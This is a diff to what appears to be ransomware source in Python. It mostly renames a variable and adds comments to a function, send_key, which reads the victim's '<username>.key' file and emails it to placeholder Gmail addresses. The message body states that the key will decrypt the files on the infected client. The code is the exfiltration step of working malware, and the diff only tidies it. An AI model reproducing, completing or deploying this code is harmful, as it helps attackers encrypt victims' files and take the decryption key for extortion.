@@ -6,10 +6,14 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 
+# GET THE ENVIRONMENT VARIABLES
+current_user = os.environ["USERNAME"]
+
+# SET THE DESTINATAIRE AND THE SENDER
 fromaddr = "FROM_TO@gmail.com"
 toaddr = "DEST_TO@gmail.com"
-usr = os.environ["USERNAME"]
 
+# FUNCTION TO PREPARE THE MAIL
 def send_key():
     try:
         msg = MIMEMultipart()
@@ -18,7 +22,7 @@ def send_key():
         msg['Subject'] = "The server you sending a key from the client"
         body = "This key will be used to decrypt the files on the client infected"
         msg.attach(MIMEText(body, 'plain'))
-        filename = "%s.key" %(usr)
+        filename = "{}.key".format(current_user)
         attachment = open(filename, "rb")
         p = MIMEBase('application', 'octet-stream')
         p.set_payload((attachment).read())
